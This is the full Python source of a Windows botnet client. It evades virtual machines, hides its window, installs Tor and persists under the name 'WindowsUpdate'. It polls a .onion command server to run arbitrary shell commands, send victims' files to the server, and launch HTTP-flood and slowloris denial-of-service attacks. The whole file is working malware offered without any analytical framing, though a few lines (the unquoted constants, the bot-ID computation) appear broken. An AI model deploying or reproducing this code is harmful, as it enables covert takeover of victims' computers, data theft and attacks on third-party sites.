#! /usr/bin/env python3
import requests
import threading
import time
import random
import platform
import socket
import uuid
import subprocess
import os
import sys
import base64
import hashlib
import ctypes
import urllib.request
import zipfile
import io
import stat

C2_ONION = zruun6ptse2pgw7337ow5sg22utkhvoxcarcsmb2cg275atldrhbszad.onion
SHARED_SECRET = ad1f3ccd547dec42908fc2cdb5b400c1
C2_URL = f"http://{C2_ONION}"
BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
ATTACK_STOP = threading.Event()
PROXIES = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

def token():
    return hashlib.sha256(f"{BOT_ID}:{SHARED_SECRET}".encode()).hexdigest()[:16]

def anti_vm():
    flags = 0
    try:
        result = subprocess.run('wmic computersystem get model', shell=True, capture_output=True, text=True)
        if any(x in result.stdout.lower() for x in ['vmware','virtualbox','qemu','kvm']): flags += 1
    except: pass
    try:
        result = subprocess.run('wmic cpu get numberofcores', shell=True, capture_output=True, text=True)
        lines = result.stdout.strip().split('\n')
        if len(lines) > 1:
            try:
                if int(lines[1].strip()) < 2: flags += 1
            except: pass
    except: pass
    if flags >= 1: sys.exit(0)

def hide_process():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        kernel32.SetConsoleTitleW(None)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass

def setup_tor():
    """Download Tor if missing, extract, and launch"""
    temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
    tor_dir = os.path.join(temp_dir, 'tor')
    tor_exe = os.path.join(tor_dir, 'tor.exe')

    if not os.path.exists(tor_exe):
        try:
            zip_path = os.path.join(temp_dir, 'tor.zip')
            # Try to download static Tor Windows binary
            urls = [
                "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.6/tor-win64-14.0.6.zip",
                "https://dist.torproject.org/torbrowser/14.0.6/tor-win64-14.0.6.zip",
            ]
            downloaded = False
            for url in urls:
                try:
                    urllib.request.urlretrieve(url, zip_path)
                    downloaded = True
                    break
                except:
                    continue
            if not downloaded:
                return
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(tor_dir)
            os.remove(zip_path)
            # Find tor.exe in extracted subdirs
            for root, dirs, files in os.walk(tor_dir):
                if 'tor.exe' in files:
                    tor_exe = os.path.join(root, 'tor.exe')
                    break
            if not os.path.exists(tor_exe):
                return
        except:
            return

    data_dir = os.path.join(temp_dir, '.cache-tor')
    os.makedirs(data_dir, exist_ok=True)

    try:
        subprocess.Popen(
            [tor_exe, '--SocksPort', '9050', '--DataDirectory', data_dir,
             '--HiddenServiceStatistics', '0'],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(5)
    except:
        pass

def persistence():
    script_path = os.path.abspath(sys.argv[0])
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
    except: pass
    try:
        tasksched = f'schtasks /create /tn "WindowsUpdate" /tr "{script_path}" /sc onlogon /delay 0002:00 /f'
        subprocess.run(tasksched, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

def register():
    try:
        r = requests.post(f"{C2_URL}/register", json={
            'bot_id': BOT_ID, 'os': 'Windows', 'hostname': socket.gethostname(),
            'cpu': os.cpu_count() or 1, 'username': os.environ.get('USERNAME','SYSTEM'),
            'token': token()
        }, proxies=PROXIES, timeout=10)
    except: pass

def poll():
    try:
        r = requests.post(f"{C2_URL}/poll", json={'bot_id': BOT_ID, 'token': token()}, proxies=PROXIES, timeout=15)
        if r.status_code != 200: return None
        return r.json()
    except: return None

def send_result(output):
    try:
        encoded = base64.b64encode(output.encode() if isinstance(output, str) else output).decode()
        requests.post(f"{C2_URL}/result", json={'bot_id': BOT_ID, 'result': encoded, 'token': token()}, proxies=PROXIES, timeout=10)
    except: pass

def send_file(filename, content):
    try:
        encoded = base64.b64encode(content).decode()
        requests.post(f"{C2_URL}/download", json={'bot_id': BOT_ID, 'filename': filename, 'content': encoded, 'token': token()}, proxies=PROXIES, timeout=30)
    except: pass

def attack_http(target, duration):
    stop_at = time.time() + duration
    while time.time() < stop_at and not ATTACK_STOP.is_set():
        try:
            requests.get(target, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}, timeout=5)
        except: pass
        time.sleep(0.05)

def attack_slowloris(target, duration):
    stop_at = time.time() + duration
    sockets = []
    while time.time() < stop_at and not ATTACK_STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            host = target.replace('http://','').replace('https://','').split('/')[0]
            s.connect((host, 80))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
            sockets.append(s)
        except: pass
        time.sleep(15)
        for s in sockets[:]:
            try: s.sendall(b"X-a: " + os.urandom(8).hex().encode() + b"\r\n")
            except: sockets.remove(s)
    for s in sockets: s.close()

def uninstall():
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.DeleteValue(regkey, "WindowsUpdate")
    except: pass
    subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True, capture_output=True)
    sys.exit(0)

def main():
    anti_vm()
    setup_tor()
    time.sleep(random.uniform(2,10))
    hide_process()
    persistence()
    register()
    while True:
        try:
            resp = poll()
            if resp:
                cmd = resp.get('command', 'idle')
                if cmd == 'shell':
                    data = resp.get('data', '')
                    if data.lower().startswith('download'):
                        path = data.split(' ', 1)[1] if ' ' in data else ''
                        if os.path.exists(path):
                            with open(path, 'rb') as f:
                                send_file(os.path.basename(path), f.read())
                    elif data.lower().strip() == 'uninstall':
                        uninstall()
                    else:
                        result = subprocess.getoutput(data)
                        send_result(result)
                elif cmd == 'download':
                    path = resp.get('path', '')
                    if os.path.exists(path):
                        with open(path, 'rb') as f:
                            send_file(os.path.basename(path), f.read())
                elif cmd == 'attack':
                    ATTACK_STOP.clear()
                    target = resp['target']; duration = resp['duration']; method = resp['method']
                    if method == 'http': attack_http(target, duration)
                    elif method == 'slowloris': attack_slowloris(target, duration)
            time.sleep(random.uniform(45, 300))
        except:
            time.sleep(random.uniform(45, 300))

if __name__ == '__main__':
    main()